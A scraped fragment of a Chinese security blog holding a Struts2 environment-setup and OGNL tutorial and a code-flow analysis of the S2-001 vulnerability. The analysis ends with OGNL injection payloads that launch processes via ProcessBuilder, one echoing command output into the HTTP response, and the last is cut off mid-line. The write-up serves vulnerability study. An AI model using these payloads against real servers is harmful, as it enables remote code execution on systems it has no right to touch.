小结终于把一系列漏洞复现完了，前面的流程分析起来还是挺有意思的，后面的主要是为自己漏洞挖掘能够提供一些思路。\nRefhttps://xz.aliyun.com/t/11633https://tttang.com/archive/1592\n","categories":["Java"],"tags":["Java"]},{"title":"Java Struts2 学习与环境搭建","url":"/2022/11/02/Java-Struts2-%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","content":"Java Struts2 学习与环境搭建\n\n0x01 前言写一篇防止其他师傅们踩坑的环境搭建文章哈哈，因为网上关于 struts2 的搭建坑比较多\n0x02 Struts2 基础Struts2 简介Apache Struts2 是一个非常优秀的 JavaWeb MVC 框架，2007年2月第一个 full release 版本发布，直到今天，Struts 发布至 2.5.26 版本，而在这些版本中，安全更新已经更新至 S2-061，其中包含了非常多的 RCE 漏洞修复。\n关于 Struts2 开发的教程其实很少，因为 Struts2 已经处于一个濒临淘汰的阶段，用的人已是甚少。下面说一说我个人对于 Struts2 的一些理解：\n参考资料：Struts2入门这一篇就够了，写的非常好。\n\nStruts2 比较像是 Spring 和 SpringMVC 的一个中间产物，它需要写一些比较复杂的 Spring 配置 xml（这种 xml 很容易写吐……）；而它又具有 SpringMVC 的特性，但是并未较好的实现。所以有了我前面的思考 ———— Struts2 比较像是 Spring 和 SpringMVC 的一个中间产物。\n\nStruts1 和 Struts2 在技术上是没有很大的关联的。 Struts2 其实基于 Web Work 框架的，只不过它的推广没有 Struts1 好，因此就拿着 Struts 这个名气推出了 Struts2 框架。\nStruts2 执行流程Struts2 是一个基于 MVC 设计模式的Web应用框架，它的本质就相当于一个 servlet，在 MVC 设计模式中，Struts2 作为控制器（Controller）来建立模型与视图的数据交互。Struts2 是在 Struts 和WebWork 的技术的基础上进行合并的全新的框架。Struts2 以 WebWork 为核心，采用拦截器的机制来处理的请求。这样的设计使得业务逻辑控制器能够与 ServletAPI 完全脱离开。\n\n\n\n对 Struts2 的执行流程简单说明\n\n\nFilter：首先经过核心的过滤器，即在 web.xml 中配置的 filter 及 filter-mapping，这部分通常会配置 /* 全部的路由交给 struts2 来处理。\nInterceptor-stack：执行拦截器，应用程序通常会在拦截器中实现一部分功能。也包括在 struts-core 包中 struts-default.xml 文件配置的默认的一些拦截器。\n配置Action：根据访问路径，找到处理这个请求对应的 Action 控制类，通常配置在 struts.xml 中的 package 中。\n最后由 Action 控制类执行请求的处理，执行结果可能是视图文件，可能是去访问另一个 Action，结果通过 HTTPServletResponse 响应。\n\n如何实现 Action 控制类通常有以下的方式\n\nAction 写为一个 POJO 类，并且包含 excute() 方法。\nAction 类实现 Action 接口。\nAction 类继承 ActionSupport 类\n\n0x03 环境搭建IDEA 选中 web-app，一路 yes\n\n\n导入 Struts2 的核心依赖\n&lt;dependency>\n    &lt;groupId>org.apache.struts&lt;/groupId>\n    &lt;artifactId>struts2-core&lt;/artifactId>\n    &lt;version>2.0.8&lt;/version>\n&lt;/dependency>\n\n再修改 web.xml，在这里主要是配置 Struts2 的过滤器。\n&lt;web-app>\n  &lt;display-name>S2-001 Example&lt;/display-name>\n  &lt;filter>\n    &lt;filter-name>struts2&lt;/filter-name>\n    &lt;filter-class>org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class>\n  &lt;/filter>\n  &lt;filter-mapping>\n    &lt;filter-name>struts2&lt;/filter-name>\n    &lt;url-pattern>/*&lt;/url-pattern>\n  &lt;/filter-mapping>\n  &lt;welcome-file-list>\n    &lt;welcome-file>index.jsp&lt;/welcome-file>\n  &lt;/welcome-file-list>\n&lt;/web-app>\n\n后续内容都是摘自 Y4tacker 师傅的文章了 https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md\nmain 下添加 Java 目录并创建类\npackage com.test.s2001.action;\n\nimport com.opensymphony.xwork2.ActionSupport;\n\npublic class LoginAction extends ActionSupport&#123;\n    private String username = null;\n    private String password = null;\n\n    public String getUsername() &#123;\n        return this.username;\n    &#125;\n\n    public String getPassword() &#123;\n        return this.password;\n    &#125;\n\n    public void setUsername(String username) &#123;\n        this.username = username;\n    &#125;\n\n    public void setPassword(String password) &#123;\n        this.password = password;\n    &#125;\n\n    public String execute() throws Exception &#123;\n        if ((this.username.isEmpty()) || (this.password.isEmpty())) &#123;\n            return \"error\";\n        &#125;\n        if ((this.username.equalsIgnoreCase(\"admin\"))\n                &amp;&amp; (this.password.equals(\"admin\"))) &#123;\n            return \"success\";\n        &#125;\n        return \"error\";\n    &#125;\n&#125;\n\n然后，在 webapp 目录下创建&amp;修改两个文件 —— index.jsp&amp;welcome.jsp，内容如下。\nindex.jsp\n&lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n         pageEncoding=\"UTF-8\"%>\n&lt;%@ taglib prefix=\"s\" uri=\"/struts-tags\" %>\n\n&lt;html>\n&lt;head>\n    &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n    &lt;title>S2-001&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;h2>S2-001 Demo&lt;/h2>\n&lt;s:form action=\"login\">\n    &lt;s:textfield name=\"username\" label=\"username\" />\n    &lt;s:textfield name=\"password\" label=\"password\" />\n    &lt;s:submit>&lt;/s:submit>\n&lt;/s:form>\n&lt;/body>\n&lt;/html>\n\nwelcome.jsp\n&lt;%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\"\n         pageEncoding=\"UTF-8\"%>\n&lt;%@ taglib prefix=\"s\" uri=\"/struts-tags\" %>\n\n&lt;html>\n&lt;head>\n    &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\">\n    &lt;title>S2-001&lt;/title>\n&lt;/head>\n&lt;body>\n&lt;p>Hello &lt;s:property value=\"username\">&lt;/s:property>&lt;/p>\n&lt;/body>\n&lt;/html>\n\n然后在 main 文件夹下创建一个 resources 文件夹，内部添加一个 struts.xml，内容为：\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>\n\n&lt;!DOCTYPE struts PUBLIC\n        \"-//Apache Software Foundation//DTD Struts Configuration 2.0//EN\"\n        \"http://struts.apache.org/dtds/struts-2.0.dtd\">\n\n&lt;struts>\n    &lt;package name=\"S2-001\" extends=\"struts-default\">\n        &lt;action name=\"login\" class=\"com.test.s2001.action.LoginAction\">\n            &lt;result name=\"success\">welcome.jsp&lt;/result>\n            &lt;result name=\"error\">index.jsp&lt;/result>\n        &lt;/action>\n    &lt;/package>\n&lt;/struts>\n\n最后配置 web.xml\n&lt;web-app>\n  &lt;display-name>S2-001 Example&lt;/display-name>\n  &lt;filter>\n    &lt;filter-name>struts2&lt;/filter-name>\n    &lt;filter-class>org.apache.struts2.dispatcher.FilterDispatcher&lt;/filter-class>\n  &lt;/filter>\n  &lt;filter-mapping>\n    &lt;filter-name>struts2&lt;/filter-name>\n    &lt;url-pattern>/*&lt;/url-pattern>\n  &lt;/filter-mapping>\n  &lt;welcome-file-list>\n    &lt;welcome-file>index.jsp&lt;/welcome-file>\n  &lt;/welcome-file-list>\n&lt;/web-app>\n\n再配置 tomcat，就起来了。\n测试成功\n\n\n0x04 OGNL 表达式OGNL 是 Object-Graph Navigation Language 的缩写，它是一种功能强大的表达式语言（Expression Language，简称为 EL），通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。\n\n这是很官方的说法，说白了就是 EL 表达式，因为之前学过一点 EL 表达式，其实 OGNL 表达式，还有 S2 系列漏洞的 payload 都非常像 EL 表达式。\n\nOGNL 三要素\n表达式（Expression）：\n表达式是整个 OGNL 的核心内容，所有的 OGNL 操作都是针对表达式解析后进行的。通过表达式来告诉 OGNL 操作到底要干些什么。因此，表达式其实是一个带有语法含义的字符串，整个字符串将规定操作的类型和内容。OGNL 表达式支持大量的表达式，如 “链式访问对象”、表达式计算、甚至还支持 Lambda 表达式。\n\nRoot 对象：\nOGNL 的 Root 对象可以理解为 OGNL 的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是 Root 对象，这就意味着，如果有一个 OGNL 表达式，那么我们需要针对 Root 对象来进行 OGNL 表达式的计算并且返回结果。\n\n上下文环境：\n有个 Root 对象和表达式，我们就可以使用 OGNL 进行简单的操作了，如对 Root 对象的赋值与取值操作。但是，实际上在 OGNL 的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL 的上下文环境是一个 Map 结构，称之为 OgnlContext。Root 对象也会被添加到上下文环境当中去。\n\n\n说白了上下文就是一个 MAP 结构，它实现了 java.utils.Map 的接口。\nOGNL 的基础使用导入 pom.xml \n&lt;dependency>\n\t&lt;groupId>ognl&lt;/groupId>\n\t&lt;artifactId>ognl&lt;/artifactId>\n\t&lt;version>3.1.19&lt;/version>\n&lt;/dependency>\n\n我们先创建两个实体类\nAddress.java\npackage pojo;  \n  \npublic class Address &#123;  \n  \n    private String port;  \n    private String address;  \n  \n    public Address(String port,String address) &#123;  \n        this.port = port;  \n        this.address = address;  \n    &#125;  \n  \n    public String getPort() &#123;  \n        return port;  \n    &#125;  \n  \n    public void setPort(String port) &#123;  \n        this.port = port;  \n    &#125;  \n  \n    public String getAddress() &#123;  \n        return address;  \n    &#125;  \n  \n    public void setAddress(String address) &#123;  \n        this.address = address;  \n    &#125;  \n&#125;\n\nUser.java\npackage pojo;  \n  \npublic class User &#123;  \n  \n    private String name;  \n    private int age;  \n    private Address address;  \n  \n    public String getName() &#123;  \n        return name;  \n    &#125;  \n  \n    public void setName(String name) &#123;  \n        this.name = name;  \n    &#125;  \n  \n    public int getAge() &#123;  \n        return age;  \n    &#125;  \n  \n    public void setAge(int age) &#123;  \n        this.age = age;  \n    &#125;  \n  \n    public Address getAddress() &#123;  \n        return address;  \n    &#125;  \n  \n    public void setAddress(Address address) &#123;  \n        this.address = address;  \n    &#125;  \n  \n    public User() &#123;&#125;  \n  \n    public User(String name, int age) &#123;  \n        this.name = name;  \n        this.age = age;  \n    &#125;  \n&#125;\n\nOGNL 使用 getValue() 方法来获取对象，并且访问对象当中的值，在后续的代码块当中，师傅们可以自行打断点进行调试，只是一些简单的 getter 与 setter 数据处理与赋值。\n对 Root 对象的访问OGNL 使用的是一种链式的风格进行对象的访问。\n所谓的链式编程，则是类似与 StringBuffer 的 append 方法的写法：\nStringBuffer buffer = new StringBuffer();\n// 链式编程\nbuffer.append(\"aaa\").append(\"bbb\").append(\"ccc\");\n\n对应的代码\nVisitRoot.java\npublic class VisitRoot &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        User user = new User(\"Drunkbaby\", 20);  \n        Address address = new Address(\"330108\", \"杭州市滨江区\");  \n        user.setAddress(address);  \n        System.out.println(Ognl.getValue(\"name\", user));   // Drunkbaby  \n        System.out.println(Ognl.getValue(\"name.length()\", user));     // 9  \n        System.out.println(Ognl.getValue(\"address\", user).toString());    // Address(port=330108, address=杭州市滨江区)  \n        System.out.println(Ognl.getValue(\"address.port\", user));   // 330108  \n    &#125;  \n&#125;\n\n\n\n对上下文对象的访问使用 OGNL 的时候如果不设置上下文对象，系统会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象则会使用传入的上下文对象。\n当访问上下文环境当中的参数时候，需要在表达式前面加上 ‘#’ ，表示了与访问 Root 对象的区别。\nVisitContext.java\npublic class VisitContext &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        User user = new User(\"Drunkbaby\", 20);  \n        Address address = new Address(\"330108\", \"杭州市滨江区\");  \n        user.setAddress(address);  \n        Map&lt;String, Object> context = new HashMap&lt;String, Object>();  \n        context.put(\"init\", \"hello\");  \n        context.put(\"user\", user);  \n        System.out.println(Ognl.getValue(\"#init\", context, user)); // hello  \n        System.out.println(Ognl.getValue(\"#user.name\", context, user));    // test  \n        System.out.println(Ognl.getValue(\"name\", context, user));  // test  \n    &#125;  \n&#125;\n\n\n\n对静态变量与静态方法的访问在 OGNL 表达式当中也可以访问静态变量或者调用静态方法，格式如 \\@[class]@[field/method ()]，猜测在后续的 S2 系列漏洞中会存在这种方式的攻击手法。\nVisitStatic.java\npublic class VisitStatic &#123;  \n  \n    public static String ONE = \"VisitStatic Success\";  \n  \n    public static void main(String[] args) throws Exception&#123;  \n        AtVisit();  \n    &#125;  \n    public static void AtVisit() throws OgnlException &#123;  \n        Object object1 = Ognl.getValue(\"@com.drunkbaby.OGNLGrammar.VisitStatic@ONE\", null);  \n        Object object2 = Ognl.getValue(\"@com.drunkbaby.OGNLGrammar.VisitContext@VisitContextMethod()\", null);  // hello、Drunkbaby、Drunkbaby  \n        System.out.println(object1);   // 访问 static 的 ONE        System.out.println(object2);   // 访问 VisitContext 的 VisitContextMethod() 方法  \n    &#125;  \n&#125;\n\n此处存在一个很有意思的现象，在这句语句执行的时候，会多返回一个 null\nObject object2 = Ognl.getValue(\"@com.drunkbaby.OGNLGrammar.VisitContext@VisitContextMethod()\", null);\n\n实际上 object2 那里是不会得到返回值的，因为 VisitContextMethod() 方法是一个 void 方法，但是通过这一点，能明确的看到，在调用 getValue() 调用任意静态方法的时候，是和反射一样存在攻击面的，不过比较窄。\n\n\n方法的调用如果需要调用 Root 对象或者上下文对象当中的方法也可以使用 . 方法的方式来调用。甚至可以传入参数。就和正常的方法调用是一样的。\n赋值的时候可以选择上下文当中的元素进行给 Root 对象的 name 属性赋值。\nMethodCall.java\npublic class MethodCall &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        User user = new User();  \n        Map&lt;String, Object> context = new HashMap&lt;String, Object>();  \n        context.put(\"name\", \"Drunkbaby\");  \n        context.put(\"password\", \"password\");  \n        System.out.println(Ognl.getValue(\"getName()\", context, user)); // null  \n        Ognl.getValue(\"setName(#name)\", context, user);  \n        System.out.println(Ognl.getValue(\"getName()\", context, user)); // Drunkbaby  \n    &#125;  \n&#125;\n\n\n\n对数组和集合的访问OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问。\npublic class VisitMaps &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        User user = new User();  \n        Map&lt;String, Object> context = new HashMap&lt;String, Object>();  \n        String[] strings  = &#123;\"aa\", \"bb\"&#125;;  \n        ArrayList&lt;String> list = new ArrayList&lt;String>();  \n        list.add(\"aa\");  \n        list.add(\"bb\");  \n        Map&lt;String, String> map = new HashMap&lt;String, String>();  \n        map.put(\"key1\", \"value1\");  \n        map.put(\"key2\", \"value2\");  \n        context.put(\"list\", list);  \n        context.put(\"strings\", strings);  \n        context.put(\"map\", map);  \n        System.out.println(Ognl.getValue(\"#strings[0]\", context, user));   // aa  \n        System.out.println(Ognl.getValue(\"#list[0]\", context, user));  // aa  \n        System.out.println(Ognl.getValue(\"#list[0 + 1]\", context, user));  // bb  \n        System.out.println(Ognl.getValue(\"#map['key1']\", context, user));  // value1  \n        System.out.println(Ognl.getValue(\"#map['key' + '2']\", context, user));     // value2  \n    &#125;  \n&#125;\n\n\n\n从上面代码不仅看到了访问数组与集合的方式同时也可以看出来 OGNL 表达式当中支持操作符的简单运算。有如下所示：\n2 + 4 &#x2F;&#x2F; 整数相加（同时也支持减法、乘法、除法、取余 [% &#x2F;mod]、）\n&quot;hell&quot; + &quot;lo&quot; &#x2F;&#x2F; 字符串相加\ni++ &#x2F;&#x2F; 递增、递减\ni &#x3D;&#x3D; j &#x2F;&#x2F; 判断\nvar in list &#x2F;&#x2F; 是否在容器当中\n\n投影与选择OGNL 支持类似数据库当中的选择与投影功能。\n\n投影：选出集合当中的相同属性组合成一个新的集合。语法为 collection.{XXX}，XXX 就是集合中每个元素的公共属性。\n\n选择：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为 collection.{Y XXX}，其中 Y 是一个选择操作符，XXX 是选择用的逻辑表达式。\n选择操作符有 3 种：\n\n? ：选择满足条件的所有元素\n\n^：选择满足条件的第一个元素\n\n$：选择满足条件的最后一个元素\n\n\n说是投影与选择，实际上更像是元素截图，类似于 substr 这种。\npublic class SelectorAndProjection &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        User p1 = new User(\"name1\", 11);  \n        User p2 = new User(\"name2\", 22);  \n        User p3 = new User(\"name3\", 33);  \n        User p4 = new User(\"name4\", 44);  \n        Map&lt;String, Object> context = new HashMap&lt;String, Object>();  \n        ArrayList&lt;User> list = new ArrayList&lt;User>();  \n        list.add(p1);  \n        list.add(p2);  \n        list.add(p3);  \n        list.add(p4);  \n        context.put(\"list\", list);  \n        System.out.println(Ognl.getValue(\"#list.&#123;age&#125;\", context, list));  \n// [11, 22, 33, 44]  \n        System.out.println(Ognl.getValue(\"#list.&#123;age + '-' + name&#125;\", context, list));  \n// [11-name1, 22-name2, 33-name3, 44-name4]  \n        System.out.println(Ognl.getValue(\"#list.&#123;? #this.age > 22&#125;\", context, list));  \n// [User(name=name3, age=33, address=null), User(name=name4, age=44, address=null)]  \n        System.out.println(Ognl.getValue(\"#list.&#123;^ #this.age > 22&#125;\", context, list));  \n// [User(name=name3, age=33, address=null)]  \n        System.out.println(Ognl.getValue(\"#list.&#123;$ #this.age > 22&#125;\", context, list));  \n// [User(name=name4, age=44, address=null)]  \n    &#125;  \n&#125;\n\n\n\n创建对象OGNL 支持直接使用表达式来创建对象。主要有三种情况：\n\n构造 List 对象：使用 {}, 中间使用 ‘,’ 进行分割如 &#123;&quot;aa&quot;, &quot;bb&quot;, &quot;cc&quot;&#125;\n构造 Map 对象：使用 #{}，中间使用 ‘, 进行分割键值对，键值对使用 ‘:’ 区分，如 #&#123;&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;&#125;\n构造任意对象：直接使用已知的对象的构造方法进行构造。\n\npublic class CreateClass &#123;  \n    public static void main(String[] args) throws Exception&#123;  \n        System.out.println(Ognl.getValue(\"#&#123;'key1':'value1'&#125;\", null)); // &#123;key1=value1&#125;  \n        System.out.println(Ognl.getValue(\"&#123;'key1','value1'&#125;\", null));  // [key1, value1]  \n        System.out.println(Ognl.getValue(\"new com.drunkbaby.pojo.User()\", null));  \n// User(name=null, age=0, address=null)  \n    &#125;  \n&#125;\n\n\n\n\n不论是之前的调用静态方法，还是现在的创建对象，都是很有攻击面的存在。\n\n弹计算器的 EXP\npublic class EvilCalc &#123;  \n    public static void main(String[] args) throws OgnlException &#123;  \n        Ognl.getValue(\"new java.lang.ProcessBuilder(new java.lang.String[]&#123;\\\"calc\\\"&#125;).start()\", null);  \n    &#125;  \n&#125;\n\n\n\n0x05 OGNL 表达式小结表达式功能操作清单：\n1. 基本对象树的访问\n对象树的访问就是通过使用点号将对象的引用串联起来进行。\n例如：xxxx，xxxx.xxxx，xxxx. xxxx. xxxx. xxxx. xxxx\n\n2. 对容器变量的访问\n对容器变量的访问，通过#符号加上表达式进行。\n例如：#xxxx，#xxxx. xxxx，#xxxx.xxxxx. xxxx. xxxx. xxxx\n\n3. 使用操作符号\nOGNL表达式中能使用的操作符基本跟Java里的操作符一样，除了能使用 +, -, *, &#x2F;, ++, --, &#x3D;&#x3D;, !&#x3D;, &#x3D; 等操作符之外，还能使用 mod, in, not in等。\n\n4. 容器、数组、对象\nOGNL支持对数组和ArrayList等容器的顺序访问：例如：group.users[0]\n同时，OGNL支持对Map的按键值查找：\n例如：#session[&#39;mySessionPropKey&#39;]\n不仅如此，OGNL还支持容器的构造的表达式：\n例如：&#123;&quot;green&quot;, &quot;red&quot;, &quot;blue&quot;&#125;构造一个List，#&#123;&quot;key1&quot; : &quot;value1&quot;, &quot;key2&quot; : &quot;value2&quot;, &quot;key3&quot; : &quot;value3&quot;&#125;构造一个Map\n你也可以通过任意类对象的构造函数进行对象新建\n例如：new Java.net.URL(&quot;xxxxxx&#x2F;&quot;)\n\n5. 对静态方法或变量的访问\n要引用类的静态方法和字段，他们的表达方式是一样的@class@member或者@class@method(args)：\n\n6. 方法调用\n直接通过类似Java的方法调用方式进行，你甚至可以传递参数：\n例如：user.getName()，group.users.size()，group.containsUser(#requestUser)\n\n7. 投影和选择\nOGNL支持类似数据库中的投影（projection） 和选择（selection）。\n投影就是选出集合中每个元素的相同属性组成新的集合，类似于关系数据库的字段操作。投影操作语法为 collection.&#123;XXX&#125;，其中XXX 是这个集合中每个元素的公共属性。\n例如：group.userList.&#123;username&#125;将获得某个group中的所有user的name的列表。\n选择就是过滤满足selection 条件的集合元素，类似于关系数据库的纪录操作。选择操作的语法为：collection.&#123;X YYY&#125;，其中X 是一个选择操作符，后面则是选择用的逻辑表达式。而选择操作符有三种：\n? 选择满足条件的所有元素\n^ 选择满足条件的第一个元素\n$ 选择满足条件的最后一个元素\n例如：group.userList.&#123;? #txxx.xxx !&#x3D; null&#125;将获得某个group中user的name不为空的user的\n\n0x06 参考资料https://jueee.github.io/2020/08/2020-08-15-Ognl%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/\n","categories":["环境搭建"],"tags":["环境搭建","Java"]},{"title":"Java Struts2 系列 S2-001","url":"/2022/10/27/Java-Struts2-%E7%B3%BB%E5%88%97-S2-001/","content":"S2-001\n\n0x01 前言对于 Struts2 这块的漏洞，我本人一直都是懒癌犯了的状态，一直没有看这一块的漏洞。\n懒癌真可怕，原本是打算 10.27 学习这块内容的，结果现在是 11.2 才开始写 …………\n关于 S2-001 的环境搭建 ——— https://github.com/Y4tacker/JavaSec/blob/main/7.Struts2%E4%B8%93%E5%8C%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md\n0x02 S2-001 漏洞复现漏洞影响范围WebWork 2.1 (with altSyntax enabled)WebWork 2.2.0 - WebWork 2.2.5Struts 2.0.0 - Struts 2.0.8\n而 Struts2 对 OGNL 表达式的解析使用了开源组件 opensymphony.xwork 2.0.3 所以会有漏洞\n流程分析\n关键流程分析其实是去看一看怎么走进到 OGNL 表达式里面进去的，又是如何处理的一个流程。看了很多文章实际上都是有点太突兀了，根本不是从漏洞发现者的角度去看漏洞的成因的。\n\n因为这一个 Web Application 的 Filter 是在 org.apache.struts2.dispatcher.FilterDispatcher 下，在这一个类的 doFilter() 方法中做了下面这些业务：\n\n设置编码和本地化信息\n创建 ActionContext 对象\n分配当前线程的分发器\n将request对象进行封装\n获取 ActionMapping 对象, ActionMapping 对象对应一个action详细配置信息\n执行 Action 请求, 也就是第 172 行的 serviceAction() 方法\n\n所以我们可以先去这个 Filter 的 doFilter() 方法下个断点，开始调试。\n\n\n前面先做了一系列判断与基础赋值，到 172 行这里，跟进 serviceAction() 方法\n首先获取当前请求是否已经有 ValueStack 对象, 这样做的目的是在接受到 chain 跳转方式的请求时, 可以直接接管上次请求的 action。如果没有 ValueStack 对象，获取当前线程的ActionContext对象；如果有 ValueStack 对象，将事先处理好的请求中的参数 put 到 ValueStack 中，获取 ActionMapping 中配置的 namespace, name, method 值\n\n\n通过 ActionProxyFactory 的 createActionProxy() 类初始化一个 ActionProxy，在这过程中也会创建 StrutsActionProxy 的实例，StrutsActionProxy 是继承自com.opensymphony.xwork2.DefaultActionProxy 的, 在这个代理对象内部实际上就持有了DefaultActionInvocation 的一个实例。所以有的文章里面会说其实是创建了DefaultActionInvocation 的一个实例。\n\n\nDefaultActionInvocation 对象中保存了 Action 调用过程中需要的一切信息，继续往下走，跟进 proxy.execute()\n\n\n获取到了上下文环境，并调用 setter 方式赋值上下文，接着继续跟进 invoke() 方法。\n\n\n在 invoke() 方法中，首先会顺序的递归执行当前 Action 中所配置的所有的拦截器, 直到拦截器遍历完毕调用真正的 Action，此处是一个 interceptor 迭代器在进行遍历操作，对应遍历的内容是 struts2 包内的 struts-default.xml 里面的 interceptors 标签中的内容\n\n\n\n在众多迭代器里面，param 这一个迭代器是用来处理我们输入的参数的，所以想到，会不会对应的迭代器里就有所谓的 OGNL 表达式的处理捏？从漏洞发现者的角度思考，一定是这样的，因为本质上来说，就是要去找 Struts2 的哪个地方调用了 OGNL 表达式，这里被找到之后，关于 S2 系列的漏洞才是开始一石激起千层浪。\n\n\n我们点进去这个类看一下，先看注释\n\n\n大致意思就是，最开始在登录框中的 username 和 password 会被保存到 stack 里面，师傅们可以观察一下确实是的。通过 ActionContext.getParameters() 方法将 stack 里面的值拿出来，再通过 ValueStack.setValue(String, Object) 方法把值 set 进去。\n接着在后文，它表明了这个类能够处理 OGNL 表达式，并且已经考虑了安全性问题，不过似乎考虑的并不到位。\n\n\n而此处的迭代的部分调用栈如下\nintercept:155, ServletConfigInterceptor (org.apache.struts2.interceptor)\ndoProfiling:224, DefaultActionInvocation$2 (com.opensymphony.xwork2)\ndoProfiling:223, DefaultActionInvocation$2 (com.opensymphony.xwork2)\nprofile:455, UtilTimerStack (com.opensymphony.xwork2.util.profiling)\ninvoke:221, DefaultActionInvocation (com.opensymphony.xwork2)\nintercept:123, AliasInterceptor (com.opensymphony.xwork2.interceptor)\ndoProfiling:224, DefaultActionInvocation$2 (com.opensymphony.xwork2)\ndoProfiling:223, DefaultActionInvocation$2 (com.opensymphony.xwork2)\nprofile:455, UtilTimerStack (com.opensymphony.xwork2.util.profiling)\ninvoke:221, DefaultActionInvocation (com.opensymphony.xwork2)\nintercept:176, ExceptionMappingInterceptor (com.opensymphony.xwork2.interceptor)\ndoProfiling:224, DefaultActionInvocation$2 (com.opensymphony.xwork2)\ndoProfiling:223, DefaultActionInvocation$2 (com.opensymphony.xwork2)\nprofile:455, UtilTimerStack (com.opensymphony.xwork2.util.profiling)\ninvoke:221, DefaultActionInvocation (com.opensymphony.xwork2)\nexecute:50, StrutsActionProxy (org.apache.struts2.impl)\nserviceAction:504, Dispatcher (org.apache.struts2.dispatcher)\ndoFilter:419, FilterDispatcher (org.apache.struts2.dispatcher)\ninternalDoFilter:193, ApplicationFilterChain (org.apache.catalina.core)\ndoFilter:166, ApplicationFilterChain (org.apache.catalina.core)\n\n师傅们可以自行跟一下，我觉得这里逻辑相当简单，就不放上来了，关键点是在这一个类里面，进行了对应的迭代器判断。\n\n\n这里的调试并非有趣，同时也比较 meaningless，直接一路 f9，直至迭代器为 params 为止，跟进。跟进之后会到 ParametersInterceptor.doIntercept() 方法处\n\n\n跟进到 setParameters() 方法里面，再从这里面跟进 setValue() 方法，为什么要跟进 setValue() 方法呢？其实是根据它的注释来的，因为 OGNL 的语句会被送到 OgnlValueStack#setValue 处进行处理。\n\n\n继续跟进再跟进\n\n\n\n\n\n\n这里过程就很复杂了，我们再来慢慢分析\n在经历过一系列迭代器之后，所以迭代器都处理完毕了，执行了 invokeActionOnly() 方法\n\n\n通过反射调用执行了 action 实现类里的 execute 方法，开始处理用户的逻辑信息\n\n\n处理完毕用户的逻辑信息之后，我们继续往下走，跟进 executeResult()\n\n\n首先 createResult() 这里创建了一个 Result 对象，对应的方法com.opensymphony.xwork2.DefaultActionInvocation#createResult\n\n\n如果当时调用 Action 返回了 Result 对象, 则直接返回；否则, 通过 proxy 对象获取配置信息, 根据 resultCode 获取到 Result 对象。\n继续往下走，executeResult() 方法中调用了 execute() 方法；跟进 doExecute()\n\n\n准备执行环境: request, pageContext 等等后，发送真正的响应信息，可以看到我们自己配置时候返回结果是 jsp 文件\n\n\n之后调用JspServlet来处理请求，在解析标签的时候，在标签的开始和结束位置，会分别调用对应实现类如org.apache.struts2.views.jsp.ComponentTagSupport 中的 doStartTag()（一些初始化操作) 及 doEndTag() （标签解析后调用end方法)方法，这下终于到了我们漏洞触发的地方，这里会调用组件 org.apache.struts2.components.UIBean 的end() 方法\n\n\n跟进 evaluateParams() 方法\n\n\n由于 altSyntax 默认开启了，接下来会调用 findValue() 方法寻找参数值\n\n\n继续跟进 translateVariables() 方法\n\n\n最终触发点是：TextParseUtil#translateVariables，在此处下了断点之后，可以看到依次进入了好几次，不同时候的 expression 的值都会有所不同，我们找到值为 password 时开始分析。比较有意思的是，在调试这里的过程中，比如现在是 password，那么 password 框就不会出现。这其实也是之前 findValue() 处所带来的不一样的地方。 \n\n\n经过两次如下代码之后，将其生成了 OGNL 表达式，返回了%&#123;password&#125;\nreturn XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);\n\n然后这次的判断不会直接走到 return，来到后面，取出 %&#123;password&#125; 中间的值 password 赋给 var\n\n\n然后通过 Object o = stack.findValue(var, asType) 获得到 password 的值为%&#123;1+1&#125;\n然后重新赋值给 expression，进行下一次循环\n\n\n在这一次循环的时候，就再次解析了 %&#123;1+1&#125; 这个 OGNL 表达式，并将其赋值给了o\n最后 expression 的值就变成了2，不是 OGNL 表达式时就会直接进入\nreturn XWorkConverter.getInstance().convertValue(stack.getContext(), result, asType);\n\n最后返回并显示在表单中，这是含有 OGNL 表达式的处理，比正常的处理多了 OGNL 这一部分，所以 Struts2 的运行流程到此结束。\n漏洞利用\nEXP 不是空穴来风，是基于 OGNL 表达式的，关于 OGNL 表达式可以看我这一篇文章：Java Struts2 学习与环境搭建\n\n%&#123;(new java.lang.ProcessBuilder(new java.lang.String[]&#123;\"calc\"&#125;)).start()&#125;\n\n或者是\n%&#123;#a=(new java.lang.ProcessBuilder(new java.lang.String[]&#123;\"cmd\",\"-c\",\"clac\"&#125;)).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\"),#f.getWriter().println(new 